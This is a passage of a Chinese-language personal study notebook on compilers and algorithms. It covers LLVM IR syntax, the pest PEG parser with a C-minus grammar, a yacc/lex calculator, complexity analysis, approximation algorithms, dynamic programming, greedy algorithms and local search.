<p><code>phi</code>：指令可以根据控制流决定值的选择，是增强版的select。比如下面的语句，如果前⼀个basic block是 <code>%btrue</code> ，那么返回 1 ，如果前⼀个basic block是 <code>%bfalse</code> ，那么返回 2 。</p>
<pre><code>btrue:
    br label %end
bfalse:
    br label %end
end:
    %y = phi i32 [1, %btrue], [2, %bfalse]
</code></pre>
</li>
</ul>
<h3 id="函数声明和定义"><a class="header" href="#函数声明和定义">函数声明和定义</a></h3>
<p>函数：最基本的函数定义如下。</p>
<pre><code class="language-assembly">define i32 @main() {
    ret i32 0
}
</code></pre>
<p>函数声明，将<code>define</code>换成<code>declare</code>。<code>declare i32 @printf(i8*, ...) #1</code>。</p>
<p>函数调用，<code>%1 = call i32 @foo(i32 1)</code></p>
<hr />
<p>参考链接：</p>
<p><a href="https://llvm.org/docs/tutorial/index.html">LLVM-IR-tutorial</a>: 看一遍，大概了解LLVM汇编的写法和基本思想。</p>
<p><a href="ttps://thedan64.github.io/inkwell/inkwell/index.html">inkwell的文档</a>: rust binding, 我更熟悉一点。</p>
<p><a href="https://llvm.org/docs/ProgrammersManual.html">LLVM-Program-Manual</a>: 我比较喜欢这里的对类的总体性介绍。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="llvm-1"><a class="header" href="#llvm-1">LLVM</a></h1>
<p>一旦我们生成了LLVM-IR，我们可以利用这个中间形式做很多的事情，比如：</p>
<ol>
<li>代码优化</li>
<li>生成特定机器的汇编代码，然后生成可执行文件</li>
<li>JIT(Just-In-Time)  编译</li>
</ol>
<h2 id="代码优化"><a class="header" href="#代码优化">代码优化</a></h2>
<div style="break-before: page; page-break-before: always;"></div><h1 id="pest"><a class="header" href="#pest">PEST</a></h1>
<p><a href="https://pest.rs/">pest</a>是一个rust库。可以用来做<strong>词法分析和语法分析</strong>，实现从source code(byte stream) -&gt; parser tree的过程。然后对parser tree进行一些加工就可以变成abstract syntax tree。</p>
<h2 id="peg"><a class="header" href="#peg">PEG</a></h2>
<blockquote>
<p>Parsing expression grammars (PEGs) are simply a strict representation of the simple imperative code that you would write if you were writing a parser by hand.</p>
</blockquote>
<p>他和正则表达式非常相似。简单的来说他只有下面一些符号</p>
<div class="table-wrapper"><table><thead><tr><th>符号</th><th>例子</th><th>含义</th></tr></thead><tbody>
<tr><td><code>{}</code></td><td><code>rule = { ... }</code></td><td>用来表示一个匹配规则，下面的例子都是匹配规则。</td></tr>
<tr><td><code>~</code></td><td><code>type_spec ~ id</code></td><td>type_spec连接着id</td></tr>
<tr><td>`</td><td>`</td><td>`&quot;int&quot;</td></tr>
<tr><td><code>+</code></td><td><code>ASCII_DIGIT+</code></td><td>1个或n个数字</td></tr>
<tr><td><code>*</code></td><td><code>ASCII_DIGIT*</code></td><td>0个或n个数字</td></tr>
<tr><td><code>?</code></td><td><code>ASCII_DIGIT?</code></td><td>0个或1个数字</td></tr>
<tr><td><code>{}</code></td><td><code>ASCII_DIGIT{n,m}</code></td><td>n到m个数字</td></tr>
<tr><td><code>^</code></td><td><code>^ASCII_DIGIT</code></td><td>匹配不是数字的其他字符</td></tr>
<tr><td><code>()</code></td><td></td><td>改变优先级，没有什么特殊的含义</td></tr>
</tbody></table>
</div>
<ul>
<li>
<p>注意PEG是贪婪的并不回溯的，他总是尽可能匹配更多的字符。<code>ANY* ~ ANY</code>，在<code>ANY*</code>的时候就会匹配整个字符串，然后<code>ANY</code>什么也匹配不到，然后失败。</p>
</li>
<li>
<p><code>SOI</code>表示流的开始，<code>EOI</code>表示流的结束。<code>ASCII_DIGIT</code>表示数字，还有其他内置的规则参考<a href="https://pest.rs/book/grammars/built-ins.html">https://pest.rs/book/grammars/built-ins.html</a>。</p>
</li>
<li>
<p>silent_rule会匹配，但只是消耗输入流。atomic_rule将匹配到的字符作为一个整体。</p>
<pre><code>silent_rule = _{ ... }
atomic_rule = @{ ... }
</code></pre>
</li>
<li>
<p><code>WHITESPACE = _{ &quot; &quot; | &quot;\n&quot; | &quot;\r&quot; }</code>通过定义空白符，空白符会被忽略。</p>
</li>
<li>
<p>和WHITESPACE类似的还有注释，注释也会被忽略。</p>
<pre><code>COMMENT = _{
    (&quot;/*&quot; ~ (!&quot;*/&quot; ~ ANY)* ~ &quot;*/&quot;) // Block comment
    | (&quot;//&quot; ~ (!&quot;\n&quot; ~ ANY)* ~ (&quot;\n&quot; | EOI)) // Line comment
}
</code></pre>
</li>
</ul>
<p>上面列出的并不是全部的用法，不过也差不多可以描述一个语言的词法了。下面这个例子是编译原理及实践书后附录定义的C minus的PEG。</p>
<pre><code class="language-pest">program = {SOI ~ (var_declaration | func_declaration)* ~ EOI}

var_declaration = {(type_spec ~ id ~ (&quot;[&quot; ~ int_literal ~ &quot;]&quot;)? ~ &quot;;&quot;)} 

func_declaration = {type_spec ~ id ~ params ~ block_stmt}
    params = {&quot;(&quot; ~ param? ~ (&quot;,&quot; ~ param)*  ~ &quot;)&quot;}
    param = {type_spec ~ id ~ pointer?}
    pointer = @{&quot;[&quot; ~ &quot;]&quot;}

block_stmt = {&quot;{&quot; ~ (var_declaration *) ~ (statement *) ~ &quot;}&quot;}        
statement = {expression_stmt | selection_stmt | iteration_stmt | return_stmt | block_stmt}
    expression_stmt = {(expression ~ &quot;;&quot;) | &quot;;&quot;}
    selection_stmt = {(&quot;if&quot; ~ &quot;(&quot; ~ expression ~ &quot;)&quot; ~ statement ~ (&quot;else&quot; ~ statement)?)}
    iteration_stmt = {&quot;while&quot; ~ &quot;(&quot; ~ expression ~ &quot;)&quot; ~ statement}
    return_stmt = {(&quot;return&quot; ~ expression ~ &quot;;&quot;) | (&quot;return&quot; ~ &quot;;&quot;)}
        
expression = {assignment_expr | equlity_expr}

assignment_expr = {var ~ assign_simple ~ expression}
unary_expr = {bracket_expr | call_expr | var | int_literal}
multiplicative_expr = {unary_expr ~ ((op_mul | op_div) ~ unary_expr)*}
additive_expr = { multiplicative_expr ~ ((op_add | op_sub) ~ multiplicative_expr)*}
cmp_expr = {additive_expr ~ ((op_ge | op_le | op_gt | op_lt)  ~ additive_expr)*}
equlity_expr = {cmp_expr ~ ((op_eq | op_ne) ~ cmp_expr)*}

var = {id ~ (&quot;[&quot; ~ expression ~ &quot;]&quot;)?}
bracket_expr = {&quot;(&quot; ~ expression ~&quot;)&quot;}
call_expr = {id ~ &quot;(&quot; ~ args ~ &quot;)&quot;}
args = {expression? ~(&quot;,&quot; ~ expression)*}
id = @{(ASCII_ALPHA | &quot;_&quot;) ~ (ASCII_ALPHA | &quot;_&quot; | ASCII_DIGIT)*}

// tokens
// type token
type_spec = {int | void}
int = {&quot;int&quot;}
void = {&quot;void&quot;}
// operation token
op_ge = {&quot;&gt;=&quot;}
op_le = {&quot;&lt;=&quot;}
op_gt = {&quot;&gt;&quot;}
op_lt = {&quot;&lt;&quot;}
op_eq = {&quot;==&quot;}
op_ne = {&quot;!=&quot;}
op_add = {&quot;+&quot;}
op_sub = {&quot;-&quot;}
op_mul = {&quot;*&quot;}
op_div = {&quot;/&quot;}
assign_simple = {&quot;=&quot;}
// literal
int_literal = { bin_literal | hex_literal | oct_literal | dec_literal }
dec_literal = @{ &quot;0&quot; | ASCII_NONZERO_DIGIT ~ ASCII_DIGIT* }
bin_literal = @{ ^&quot;0b&quot; ~ ASCII_BIN_DIGIT+ }
oct_literal = @{ ^&quot;0o&quot; ~ ASCII_OCT_DIGIT+ }
hex_literal = @{ ^&quot;0x&quot; ~ ASCII_HEX_DIGIT+ }

WHITESPACE = _{ &quot; &quot; | &quot;\n&quot; | &quot;\r&quot; }
COMMENT = _{
    (&quot;/*&quot; ~ (!&quot;*/&quot; ~ ANY)* ~ &quot;*/&quot;) // Block comment
    | (&quot;//&quot; ~ (!&quot;\n&quot; ~ ANY)* ~ (&quot;\n&quot; | EOI)) // Line comment
}
</code></pre>
<h2 id="parse"><a class="header" href="#parse">Parse</a></h2>
<p>通过下面的语法定义一个Parser，grammar.pest就是你刚刚编写的规则文件。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>#[derive(Parser)]
#[grammar = &quot;grammar.pest&quot;]
pub struct CParser;
<span class="boring">}
</span></code></pre></pre>
<p>开始分析，调用parse方法。第一个参数是规则，我们分析程序就从顶层规则开始分析，第二个参数是待分析的字符流。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let root:Pair&lt;_&gt; = CParser::parse(Rule::program, &amp;source_code).
	unwrap().
	next().
	unwrap();
<span class="boring">}
</span></code></pre></pre>
<p>root是Pair类型的，可以简单的认为Pair代表了一个匹配。怎么使用Pair呢？我们不关心他的具体表示，关注他提供的接口。一般下面三个就够了。从接口上不难看出他已经形成了一个树形结构，也就是parser tree。然后你可以遍历这个树，去创建你的AST。这个是没有一个标准的算法的，因为AST更多的是你个人定义的，可以用来表达意思的一个树，没有标准的格式。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 匹配到的规则
assert_eq!(root.as_rule(), super::Rule::program);
// 匹配到的字符串
println!(&quot;{}&quot;,root.as_str());
// 匹配到的规则，其中的子规则，是一个Pair的迭代器。
for pair in root.into_inner() {
    ...
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="yacc"><a class="header" href="#yacc">Yacc</a></h1>
<p>yacc的基本格式和lex非常相似。</p>
<pre><code>声明部分
%%
翻译规则
%%
辅助函数
</code></pre>
<p>声明部分：包括头文件的引用，词法单元的声明。</p>
<p>翻译规则：<code>&lt;产生式头&gt;: &lt;产生式体1&gt;{语义动作1} | &lt;产生式体2&gt;{语义动作2} | ...;</code></p>
<p>当yacc遇见二义性的文法的时候，会县级，默认采用下面的方式</p>
<ul>
<li>解决一个归约/归约冲突的时候，选择Yacc归约中列在前面的那个冲突产生式。</li>
<li>解决一个移入/归约冲突的时候，总是选择移入。</li>
</ul>
<p>也可以显式的指定，在声明部分可以给终结符号赋予优先级和结合性</p>
<p><code>%left '+' '-'</code> 使得<code>+</code>和<code>-</code>拥有相同的优先级，并且都是左结合的。先声明的词法单元优先级低。</p>
<p>一个yacc和lex的例子，他们实现了一个桌面计算器。</p>
<pre><code class="language-yacc">%{
#include &lt;stdio.h&gt;
int yylex(void);
int yyerror(char *s);
%}
%token NUMBER

%left '+' '-'
%left '*' '/'
%left '^'
%right UMINUS

%%
lines   : lines expr '\n' { printf(&quot;= %d\n&quot;, $2); }
        | lines '\n' 
        | /* empty */
        ;

expr    : expr '+' expr { $$ = $1 + $3; }
        | expr '-' expr { $$ = $1 - $3; }
        | expr '*' expr { $$ = $1 * $3; }
        | expr '/' expr { 
            if ($3 == 0) {
                yyerror(&quot;Divisor cannot be zero&quot;);
            } else {
                $$ = $1 / $3; 
            }
        }
        | expr '^' expr { 
            if ($3 &lt; 0) {
                yyerror(&quot;Exponent cannot be negative&quot;);
            } else{
                $$ = 1;
                for (int i=0;i &lt; $3; i++) {
                    $$ *= $1;
                }
            }
        }
        | '(' expr ')'  { $$ = $2; }
        | '-' expr %prec UMINUS { $$ = -$2; }
        | NUMBER
        ;
%%
int main()
{
    yyparse();
    return 0;
}

int yyerror(char *s)
{
    printf(&quot;%s\n&quot;,s);
    return 0;
}

int yywrap() 
{ 
   return 1;
}
// ===========================
%{
#include &quot;cal.tab.h&quot;
extern int yylval;
%}

%%
[0-9]+  { yylval = atoi(yytext); return NUMBER; }
[ \t]   ;       /* ignore white space */
.|\n   return yytext[0];
%%
</code></pre>
<p>yacc的输入是巴科斯范式（BNF）表达的语法规则以及语法规约的处理代码，输出的是基于表驱动的编译器，包含输入的语法规约的处理代码部分。</p>
<p>yacc是开发编译器的一个有用的工具，采用LALR（1）语法分析方法。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="data-structure-and-algorithm"><a class="header" href="#data-structure-and-algorithm">Data Structure And Algorithm</a></h1>
<p>我的数据结构与算法这门课学的并不好，以后得找机会好好学学。</p>
<ol>
<li>数据结构或算法的简单介绍，比如其背景、应用。</li>
<li>数据结构或算法的思路和内容。</li>
<li>数据结构或算法的例程/例题。</li>
<li>数据结构或算法的复杂度。</li>
</ol>
<p>这里的算法既不是ACM级别的高难算法，但也不是仅限于大学数据结构的基本算法。整理的目的是为了让自己知道解决什么样的问题可以使用什么数据结构和算法，以及他们相应的时间复杂度和空间复杂度是多少。</p>
<h2 id="复杂度表示"><a class="header" href="#复杂度表示">复杂度表示</a></h2>
<p>$T(N) = O(f(N))$ ：如果存在常数c使得 $T(N) \le cf(N)$ 在N足够大的时候恒成立。所以我们一般找到最小的$f(N)$。</p>
<p>$T(N) = \Omega (f(N))$ ：如果存在常数c使得 $T(N) \geq cf(N)$ 在N足够大的时候恒成立。所以我们一般找到最大的$f(N)$。</p>
<p>$T(N) = \Theta (f(N))$ ：$T(N) = \Omega (f(N))$ 和 $T(N) = O(f(N))$ 同时成立。</p>
<p>$T(N) = o(f(N))$ ：</p>
<p>运算律：</p>
<p>$T_1(N) + T_2(N) = max( O( f (N)), O( g(N)) )$，或者意味着程序的复杂度由其中最复杂的算法决定（我瞎说的。</p>
<p>$T_1(N) * T_2(N) = O( f (N) * g(N) )$</p>
<h2 id="时间复杂度计算"><a class="header" href="#时间复杂度计算">时间复杂度计算</a></h2>
<p><code>if-else</code>：判断语句+分支中最复杂的一条</p>
<p><code>for-loop</code>：看最内层的循环。</p>
<p><code>recursive</code>：通过递推式子计算。</p>
<h2 id="空间复杂度计算"><a class="header" href="#空间复杂度计算">空间复杂度计算</a></h2>
<p>一个算法的空间复杂度只考虑在运行过程中为<strong>局部变量</strong>分配的存储空间的大小，它包括为参数表中形参变量分配的存储空间和为在函数体中定义的局部变量分配的存储空间两个部分。</p>
<p>对于递归算法为：最大递归深度N*每次分配的局部变量大小。</p>
<p>一般简单算法的空间复杂度都是1。</p>
<p>时间复杂度和空间复杂度往往是相互影响的。</p>
<h2 id="摊还分析"><a class="header" href="#摊还分析">摊还分析</a></h2>
<p><strong>摊还分析amortized analysis</strong>不同于平均情况分析，它并<strong>不涉及概率</strong>，它可以保证最坏情况下每个操作的平均性能。</p>
<ul>
<li>
<p><strong>aggregate analysis 聚合分析</strong>：这种方法用来确定一个n个操作的序列的总代价的上界$T(n)$。因而每个操作的平均代价为$T (n)/ n$。</p>
</li>
<li>
<p><strong>potential method 势能法</strong>：与核算法类似，势能法也是分析每个操作的摊还代价而且也是通过较早操作的余额来补偿稍后操作的差额。势能法将信用作为数据结构的“势能”储存起来。与核算法不同，它将势能作为一个整体储存，而不是将信用与数据结构中单个对象关联分开储存。</p>
<p>势能法工作方式如下。我们将对一个初始数据结构D。执行n个操作。对每个$i=1,2,...n$令$c_i$为第i个操作的实际代价（非负），令$D_i$为在<strong>数据结构</strong>$D_{i-1}$上执行第 i个操作得到的结果数据结构。势函数$\Phi$ 将每个数据结构$D_i$映射到一个实数$\Phi (D_i)$，此值即为关联到数据结构$D_i$的<strong>势</strong>。<strong>第i个操作的摊还代价</strong>$\hat c_i$用势函数$\Phi$定义为：
$\hat {c_i} = c_i + \Phi(D_i) - \Phi(D_{i-1})$
总摊还代价$\Sigma {c_i} =\Sigma c_i + \Phi(D_i) - \Phi(D_{0})$。所以我们让$\Phi (D_i) \geq \Phi(D_0)$恒成立，我们就找到了一个总代价的上界。我们就可以整出摊还代价了。我们通常让$\Phi(D_0) = 0$，然后让$\Phi(D_i) \geq 0$</p>
<p>In general, a good potential function should always assume its minimum at the start of the sequence.</p>
</li>
<li>
<p><strong>accounting method 核算法</strong>：当存在不止一种操作时，每种操作的摊还代价可能是不同的。核算法将序列中某些较早的操作的“余额”(overcharge)作为“预付信用”(pre-paid credit)储存起来与数据结构中的特定对象相关联。在操作序列中随后的部分，储存的信用即可用来为那些缴费少于实际代价的操作支付差额。
假设操作i的真实代价是$c_i$，我们构造操作i的费用$\hat {c_i}$，对任意n个操作序列我们让不等式$\Sigma ^n_i {\hat {c_i}} \geq \Sigma ^n_i{c_i}$恒成立。这样我们的费用就是实际代价的上界了，摊还代价就是$O(\Sigma ^n_i {\hat {c_i}}/n)$了。</p>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="algorithm"><a class="header" href="#algorithm">Algorithm</a></h1>
<p>这里介绍算法入门-排序算法。</p>
<p>以及算法的基本思想：</p>
<ol>
<li>动态规划-把问题分解成规模较小子问题，这些子问题之间互相不独立，通过子问题的解求解原问题。</li>
<li>贪心算法-局部最优到全局最优，</li>
<li>回溯算法-回溯算法实际上一个类似枚举的搜索尝试过程，主要是在搜索尝试过程中寻找问题的解，当发现已不满足求解条件时，就“回溯”返回，尝试别的路径。</li>
<li>分治算法-把问题分解为若干个规模较小的子问题，这些子问题相互独立且与原问题相同，递归的解这些子问题，然后把各个子问题的解合并得到原问题的解。</li>
<li>枚举算法-暴力</li>
</ol>
<p>此外还介绍了局部搜索、并行算法、随机化算法。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="近似算法"><a class="header" href="#近似算法">近似算法</a></h1>
<p>许多有实际意义的问题是NPC问题。如果规模小的话我们可以求精确解，但是对于规模大的问题，我们就可以用多项式复杂度的算法求近似最优解。
Approximation Ratio:  $\rho(n) = max(C/C^<em>,C^</em>/C)$。</p>
<p>(1+ ε)-approximation algorithm: 除了问题的输入，还要输入希望求得解的精度ε,ratio是1+ε。</p>
<p>We say that an approximation scheme is a <strong>polynomial-time approximation scheme (PTAS)</strong> if for any fixed $\epsilon&gt;0$, the scheme runs in time polynomial in the size n of its input instance. 比如$O(n^{2/\epsilon})$对任何$\epsilon$都有一个多项式复杂度算法。</p>
<p>In PTAS algorithms, the exponent of the polynomial can increase dramatically as ε reduces, for example if the runtime is $O(n^{(1/ε)!})$ which is a problem. There is a stricter scheme, <strong>F</strong>ully <strong>P</strong>olynomial <strong>T</strong>ime <strong>A</strong>pproximation <strong>S</strong>cheme (FPTAS). In FPTAS, algorithm need to polynomial in both the problem size n and 1/ε. 像上面那个例子就不是FPTAS，而$O((1/\epsilon)^2n^3)$就是FPTAS。</p>
<p>我确实听不懂这些东西，只能记住了。</p>
<h2 id="bin-packing"><a class="header" href="#bin-packing">Bin Packing</a></h2>
<p>Given N items of sizes S1 , S2 , …, SN , such that 0 &lt; Si ≤ 1 for all 1 ≤ i ≤ N . Pack these items in the fewest number of bins, each of which has unit capacity.</p>
<ul>
<li>
<p>Next fit：背包塞不下下一个了就在来一个背包。如果最优解是$OP=M$个背包，不会超过$NF &lt; 2M – 1$。特点是<strong>相邻的两个箱子</strong>之和大于1。Next Fit is a 2-approximation for Bin Packing. The algorithm runs in O (n) time</p>
</li>
<li>
<p>First fit：每次扫描一遍，看看第一个能装下的就放进去，否则再创建一个。$FFD(L)≤(11/9)OPT(L)+1$。特点是<strong>任意的两个箱子</strong>之和大于1。不会超过$1.7M^*$。</p>
</li>
<li>
<p>Best fit：每次扫描一遍，找到能装下的余量最小的放进去，否则再创建一个。（扫描不一定是线性的，也可以维护一个堆）Best Fit is a 3/2-approximation for Bin Packing. The algorithm runs in $O(n^2)$  time.</p>
</li>
<li>
<p>offline算法：先从大到小排序再用best fit，不会超过$11M / 9 + 6/9$。</p>
</li>
</ul>
<p>There is no ρ-approximation algorithm with ρ &lt; 3/2 for Bin Packing unless P = NP.</p>
<h2 id="knapsack-problem"><a class="header" href="#knapsack-problem">Knapsack problem</a></h2>
<p>背包问题。有一个容量为M的背包。有N个item，每个iterm有weight $w_i$和profit $p_i$。我们的如果item是可分的，目标是在$\Sigma x_i&lt;M,x_i \le w_i$的情况下让$\Sigma p_i*x_i$最大。
简单的使用贪心算法，先拿$p_i/w_i$大的。</p>
<p>难得是item不可分，我们要在我们选择的item的$\Sigma w_i&lt;M$的情况下让$\Sigma p_i$最大。
如果我们用上面类似的贪心算法来近似，approximation ratio=2。</p>
<p>如果用动态规划算法，时间复杂度是$O(N^2P)$，但是这并不意味着多项式时间。P可能很大，是$2^n$级别的。</p>
<blockquote>
<p>设 DP 状态 $f_{i,j}$ 为在只能放前 $i$ 个物品的情况下，容量为 $j$ 的背包所能达到的最大总价值。
考虑转移。假设当前已经处理好了前 $i-1$ 个物品的所有状态，那么对于第 $i$ 个物品，当其不放入背包时，背包的剩余容量不变，背包中物品的总价值也不变，故这种情况的最大价值为 $f_{i-1,j}$；当其放入背包时，背包的剩余容量会减小 $w_{i}$，背包中物品的总价值会增大 $v_{i}$，故这种情况的最大价值为 $f_{i-1,j-w_{i}}+v_{i}$。
由此可以得出状态转移方程：
$$
f_{i,j}=\max(f_{i-1,j},f_{i-1,j-w_{i}}+v_{i})
$$
由于对 $f_i$ 有影响的只有 $f_{i-1}$，可以去掉第一维，直接用 $f_{i}$ 来表示处理到当前物品时背包容量为 $i$ 的最大价值，得出以下方程：
$$
f_j=\max \left(f_j,f_{j-w_i}+v_i\right)
$$</p>
</blockquote>
<h2 id="the-k-center-problem"><a class="header" href="#the-k-center-problem">The K-center Problem</a></h2>
<h2 id="vertex-cover"><a class="header" href="#vertex-cover">vertex cover</a></h2>
<p>在图论的数学学科中，图的顶点覆盖（有时是节点覆盖）是一组顶点的集合，使得图的每个边缘至少与集合中的一个顶点相连接。 他是NPC问题。</p>
<p>一个2-approximation算法</p>
<pre><code>C = {}
E' = G.E
while E != {};
  let (u,v) be an arbitrary edge of E'
  C = C U {u,v}
  remove from E' every edge incident on either u or v
return C
</code></pre>
<p>证明为什么是2：</p>
<p>如果我们的近似算法用的顶点集合为$C$，边集合为$A$，而最优化算法用顶点$C^*$。</p>
<p>首先，因为近似算法实现了节点覆盖，而$A$中不存在两条边拥有同一个顶点，所以$|C^*|\ge |A|$。</p>
<p>算法第四行每次执行都会选出一条边，两个端点都不在C中，因此返回顶点覆盖的上界是$|C|=2|A|$。</p>
<p>故$2|C^*|\ge|C|$。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="递归回溯"><a class="header" href="#递归回溯">递归回溯</a></h1>
<h3 id="模板"><a class="header" href="#模板">模板</a></h3>
<p>深度优先搜索。一个规模为N的问题，分解成(x1)=&gt; (x1,x2) =&gt; ... (x1,x2,...xN)的解决过程。或者说，一步一步的解决问题。如果中间发现已经不满足条件了，就返回。
所以解决的关键是如何分解问题，然后给出一个好的Check函数。</p>
<pre><code class="language-c">bool Backtracking (int i){
    Found = false;
    if (i &gt; N)
        return true;    /* 说明问题已经解决了(x1, x2, ..., xn)*/
    for (each xi in S) {
        /* 剪枝，检查问题的部分解(x1,...xi)是否满足约束R */
        OK = check((x1, x2,... xi), R) 
        if (OK) {
            Count xi in;
            Found = Backtracking(i+1);
            if (!Found)
                Undo(i);    /*recover to (x1,x2,... xi-1) */
        }
        if (Found) break;
    }
    return Found;
}
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="分治算法"><a class="header" href="#分治算法">分治算法</a></h1>
<h2 id="复杂度分析"><a class="header" href="#复杂度分析">复杂度分析</a></h2>
<p>分治算法的复杂度往往是用递归式$T(N) = aT(N/b)+f(N)$表达的。这个f(N)的意思是把分开的几部分合并起来的时间复杂度。</p>
<p>那么我们应该如何分析分治算法的复杂度呢，或者说该如何求解这个递归式呢？</p>
<p>下面的理论叫做<strong>主方法(Master theorem)</strong>，来自算法导论。</p>
<p><img src="Basic/DataStructure/Algorithm/../images/image-20210413122029845.png" alt="image-20210413122029845" /></p>
<p>你可以简单的理解为把$f(n)$和$n^{log_b(a)}$进行大小比较。</p>
<ul>
<li>如果$f(n)$小就是第一种。但是需要注意的是，这里的“小”是多项式意义上的小，比如$n^1&lt;n^{1.1}$是多项式意义上的小，但是$n&lt;nlog(n)$不是多项式意义上的小。$T(n) = n^{log_ba}$</li>
<li>如果是同一个大小级别就是第二种。$T(n) = \Theta(n^{log_ba}lg(n)))$</li>
<li>如果$f(n)$大就是第三种。$T(n) = \Theta(f(n))$</li>
</ul>
<p>因为可能出现<strong>小于而不是多项式小于、大于而不是多项式大于</strong>的情况，所以这个方法并不是对所有的情况都适用的。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="动态规划"><a class="header" href="#动态规划">动态规划</a></h1>
<blockquote>
<p>动态规划（Dynamic programming，简称 DP）是一种在数学、管理科学、计算机科学、经济学和生物信息学中使用的，通过把原问题分解为相对简单的子问题的方式求解复杂问题的方法。
动态规划常常适用于有重叠子问题和最优子结构性质的问题，动态规划方法所耗时间往往远少于朴素解法。
动态规划背后的基本思想非常简单。大致上，若要解一个给定问题，我们需要解其不同部分（即子问题），再根据子问题的解以得出原问题的解。
通常许多子问题非常相似，为此动态规划法试图仅仅解决每个子问题一次，从而减少计算量：一旦某个给定子问题的解已经算出，则将其记忆化存储，以便下次需要同一个子问题解之时直接查表。这种做法在重复子问题的数目关于输入的规模呈指数增长时特别有用。
严格意义上，动态规划只能用来解决最优化问题，但在 OI 中，计数等非最优化问题的递推解法也常被不规范地称作 DP。事实上，动态规划与其它类型的递推的确有很多相似之处，学习时可以注意它们之间的异同。</p>
</blockquote>
<p>Optimal substructure+Overlap sub-problem。不能有history dependency。</p>
<p>一个问题能否用动态规划的方法解决，关键搞清楚，<strong>通过解决子问题能不能解决整个问题</strong>。</p>
<h2 id="optimal-binary-search-tree"><a class="header" href="#optimal-binary-search-tree">Optimal Binary Search Tree</a></h2>
<p><img src="Basic/DataStructure/Algorithm/../images/image-20210707200936629.png" alt="image-20210707200936629" /></p>
<p>定义了4个量：</p>
<ul>
<li>$T_{i,j}$ : 从i到j最小的时间代价</li>
<li>$p_{i}$ : 第i个节点被访问到的可能性</li>
<li>$w_{i,j}$: $p_{i} + p_{i+1} + ... + p_{j}$</li>
<li>$c_{i,j}$ : 从i到j访问的最小时间代价</li>
</ul>
<p>那么我们有$c_{i,j} = min_{i\le k\le j}(p_k + c_{i,k-1} + w_{i,k-1} + c_{k+1,j} + w_{k+1,j}) = min_{i\le k\le j}(w_{i,j} + c_{i,k-1} + c_{k+1,j})$</p>
<p>所以我们要找到的解其实就是$c_{1,N}$。
我们可以从规模入手，研究区间长度是$1,2,3...N$的$c_{x,y}$。
因为我们要让 <strong>后一个在前一个的基础上</strong> 得以计算。</p>
<p>我们要解决的问题是$c_{1,n}$
状态转移方程：$c_{i,j}=min_{k \ in [i,j]}(w_{i,j},+c_{i,k-1}+c_{k+1,j})$
初始状态（和已知条件）：$w$,$c_{i,i}$</p>
<p>我们让问题规模$(j-i$)从0到n，枚举初始i，再枚举中间k，然后就可以解决这个问题了。</p>
<p>在决定循环顺序的时候，要注意问题的依赖性。子问题一定要先解决。
如果要记录解决问题的过程，可能要引入别的变量。</p>
<h2 id="floyd算法"><a class="header" href="#floyd算法">Floyd算法</a></h2>
<p>注意循环的最外层是K。解决的是图中任意两点之间的最短路问题。</p>
<pre><code class="language-c">/* A[ ] contains the adjacency matrix with A[ i ][ i ] = 0 */
/* D[ ] contains the values of the shortest path */
/* N is the number of vertices */
/* A negative cycle exists iff D[ i ][ i ] &lt; 0 */
void AllPairs( TwoDimArray A, TwoDimArray D, int N )
{
    int i, j, k;
    for ( i = 0; i &lt; N; i++ ) /* Initialize D */
    	for( j = 0; j &lt; N; j++ )
    		D[ i ][ j ] = A[ i ][ j ];
    for( k = 0; k &lt; N; k++ ) /* add one vertex k into the path */
        for( i = 0; i &lt; N; i++ )
            for( j = 0; j &lt; N; j++ )
                if( D[ i ][ k ] + D[ k ][ j ] &lt; D[ i ][ j ] )
                    /* Update shortest path */
                    D[ i ][ j ] = D[ i ][ k ] + D[ k ][ j ];
}
</code></pre>
<h2 id="背包问题"><a class="header" href="#背包问题">背包问题</a></h2>
<p>https://oi-wiki.org/dp/knapsack/</p>
<p>https://zhuanlan.zhihu.com/p/93857890</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="贪心算法"><a class="header" href="#贪心算法">贪心算法</a></h1>
<p>使用贪心算法解决问题的步骤：</p>
<ol>
<li>Cast the optimization problem as one in which we make a choice and are left with one subproblem to solve.</li>
<li>Prove that there is always an optimal solution to the original problem that makes the greedy choice, so that the greedy choice is always safe.</li>
<li>Demonstrate optimal substructure by showing that, having made the greedy choice, what remains is a subproblem with the property that if we combine an optimal solution to the subproblem with the greedy choice we have made, we arrive at an optimal solution to the original problem. </li>
</ol>
<p>一般来说，贪心算法都是DP算法能解决的问题的一种特殊情况的解法。</p>
<h2 id="activity-selection"><a class="header" href="#activity-selection">Activity Selection</a></h2>
<p>我们有一组活动，每个活动都有一个开始时间Si和结束时间Fi。每个活动都共享同一个公共的资源（比如教室等）所以同一时间只能有一个活动。现在的问题就是要在指定的时间内让举办的活动数量做大。</p>
<p>例如下面的活动集合：</p>
<div class="table-wrapper"><table><thead><tr><th>i</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>10</th><th>11</th></tr></thead><tbody>
<tr><td>s[i]</td><td>1</td><td>3</td><td>0</td><td>5</td><td>3</td><td>5</td><td>6</td><td>8</td><td>8</td><td>2</td><td>12</td></tr>
<tr><td>f[i]</td><td>4</td><td>5</td><td>6</td><td>7</td><td>9</td><td>9</td><td>10</td><td>11</td><td>12</td><td>14</td><td>16</td></tr>
</tbody></table>
</div>
<p>那么 {a[1], a[4], a[8], a[11]} 是一个最大兼容活动子集，另一个是 {a[2], a[4], a[9], a[11]}</p>
<p>正确的贪心算法优先应该选结束时间最早的活动。（所以先排序）</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="本地搜索"><a class="header" href="#本地搜索">本地搜索</a></h1>
<p>一个典型的local search是梯度下降法。Local search和贪心算法有一点类似，但他们是两个完全不同的东西。Local search可以很好的来“解决”NPC问题，准确的说是求一个有一定意义的较好的解。</p>
